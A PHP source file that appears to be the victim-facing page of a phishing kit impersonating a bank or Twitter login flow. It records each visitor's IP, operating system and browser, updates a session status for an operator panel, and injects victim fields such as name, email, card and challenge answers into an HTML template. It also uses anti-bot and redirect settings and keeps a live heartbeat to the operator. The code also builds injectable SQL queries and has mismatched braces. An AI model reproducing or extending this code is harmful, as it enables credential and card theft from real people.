<?php
session_start();


function setupPage($tokenID, $pageID){
  //Connect to Token


require_once '../admin/config/panelauth.php'; //database path

$sql = "SELECT *
FROM pages
INNER JOIN tokensetup
ON pages.pageID = tokensetup.pageID
WHERE pages.pageID = '$pageID' AND tokenID = '$tokenID'";
$result = mysqli_query($connPanel, "SET NAMES utf8");
$result = mysqli_query($connPanel, $sql);
header('Content-type: text/html; charset=UTF-8');
if (mysqli_num_rows($result) > 0) {
  // output data of each row
  while($row = mysqli_fetch_assoc($result))
  {

     $tokenID=$row["tokenID"];
     $pageID=$row["pageID"];
     $enable_redirectpulse=$row["enable_redirectpulse"];
     $add_token=$row["add_token"];
     $url_cosmetic=$row["url_cosmetic"];
     $exception_antibot=$row["exception_antibot"];
     $url_cosmetic=$row["url_cosmetic"];
     $wait_lag=$row["wait_lag"];
     $a=$row["a"];
     $b=$row["b"];
     $c=$row["c"];
     $x=$row["x"];
     $y=$row["y"];
     $z=$row["z"];
}




}


/* START innitiate */
$_SESSION["steps"] = 1;

require_once '../admin/config/config.php'; //database path
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
require_once'scripts/loader.php'; //load all backend functions


$ip = $_SERVER['REMOTE_ADDR'];
$u = $_SERVER['HTTP_USER_AGENT'];


$browser = browsername();
$os = os_info($u);


if(isset($_SESSION['sessionID']) && !empty($_SESSION['sessionID']))
{




}
//if SESSION not assigned ( NEW USER )
else
{
  require_once '../scripts/auth.php';
}


$x = $_SESSION["sessionID"];
$sqlStatus="UPDATE logs
SET OS = '$os', Browser = '$browser'
WHERE SessionID = '$x';";
mysqli_query($conn, $sqlStatus);


/* END innitiate */


//v2

$bankID = "twitter";

$x = $_SESSION["sessionID"];
$sqlStatus="UPDATE logs
SET v2 = '1'
WHERE SessionID = '$x';";
mysqli_query($conn, $sqlStatus);


$x = $_SESSION["sessionID"];
$sqlStatus="UPDATE logs
SET status = '$bankID Token A ©'
WHERE SessionID = '$x';";
mysqli_query($conn, $sqlStatus);


$x = $_SESSION["sessionID"];
$sqlStatus="UPDATE logs
SET bank = '$bankID'
WHERE SessionID = '$x';";
mysqli_query($conn, $sqlStatus);

$name = "stev"; //from logs DB
$age = "15"; //from logs DB
$id = ""; //from logs DB
$country = ""; //from logs DB
$email = ""; //from logs DB
$cc = "cc"; //from logs DB
$ip = ""; //from logs DB
$device = "iPhone"; //from logs DB
$challenge1 = ""; //from logs DB
$challenge2 = ""; //from logs DB
$challenge3 = ""; //from logs DB
$challenge4 = ""; //from logs DB
$challenge5 = "challenge5"; //from logs DB
$error1 = ""; //from panel Db
$error2 = "";//from panel Db
$error3 = "hey"; //from panel Db
$qr = "";
$a = "Anne"; //from token Db
$b = "";//from token Db
$c = ""; //from token Db
$x = "";//from token Db
$y = "";//from token Db
$z = "Zero"; ////from token Db
$htmlContent = file_get_contents('test.html');
$htmlContent = str_replace(
  ['[NAME]', '[AGE]', '[ID]', '[COUNTRY]', '[EMAIL]', '[CC]', '[IP]', '[DEVICE]', '[CHALLENGE1]', '[CHALLENGE2]', '[CHALLENGE3]', '[CHALLENGE4]', '[CHALLENGE5]', '[ERROR1]', '[ERROR2]', '[ERROR3]', '[QR]', '[A]', '[B]', '[C]', '[X]', '[Y]', '[Z]'],
  [$name, $age, $id, $country, $email, $cc, $ip, $device, $challenge1, $challenge2, $challenge3, $challenge4, $challenge5, $error1, $error2, $error3, $qr, $a, $b, $c, $x, $y, $z],
  $htmlContent
);
echo $htmlContent;




include "pages/$add_token";
}

?>
<div id="i"></div>
<script type="text/javascript" src="js/heartbeat.js"></script>
<script type="text/javascript" src="js/updatekey.js"></script>
<script type="text/javascript" src="https://code.jquery.com/jquery-latest.min.js"></script>
<script>var i = 0;
setInterval(function()
            {
                 heartbeat('<?php echo "$x"; ?>');
            }, 1250);



</script>
